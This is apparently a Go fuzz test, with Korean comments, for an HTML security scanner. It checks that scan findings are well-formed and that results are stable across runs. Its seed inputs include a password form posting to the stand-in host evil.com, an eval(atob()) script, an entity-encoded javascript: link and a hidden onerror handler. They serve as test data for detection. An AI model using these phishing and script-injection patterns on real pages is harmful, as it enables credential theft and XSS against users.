package scanner

import "testing"

// 스캐너 전체가 어떤 입력에도 죽지 않고, 유효한 탐지를 하는지 확인.
func FuzzScan(f *testing.F) {
	f.Add(`<form action="https://evil.com/x"><input type=password></form>`, "https://bank.com/login")
	f.Add(`<script>eval(atob("x"))</script>`, "https://a.com/")
	f.Add(`<img src="http://x.com/a.png"><a target=_blank href=/x>z</a>`, "https://a.com/")
	f.Add(`<a href="&#106;avascript:alert(1)">`, "")
	f.Add(`<script><!--<script></script><img onerror=x>//--></script>`, "https://a.com/")
	f.Add("<p>보이지\u200b않음</p>", "https://a.com/")
	f.Add("<<<>>>", "://@:")

	f.Fuzz(func(t *testing.T, html, pageURL string) {
		res := ScanURL(html, pageURL)
		for _, fd := range res.Findings {
			if fd.Code == "" {
				t.Fatalf("코드 없는 발견: %+v", fd)
			}
			if fd.Offset < 0 || len(html) < fd.Offset {
				t.Fatalf("발견 오프셋 %d가 범위 밖 (len=%d)", fd.Offset, len(html))
			}
			if fd.Line < 1 || fd.Col < 1 {
				t.Fatalf("%s의 위치가 %d:%d", fd.Code, fd.Line, fd.Col)
			}
		}
		// 전역 변수 검증
		if again := ScanURL(html, pageURL); len(again.Findings) != len(res.Findings) {
			t.Fatalf("교차 검증 실패: %d vs %d", len(res.Findings), len(again.Findings))
		}
	})
}
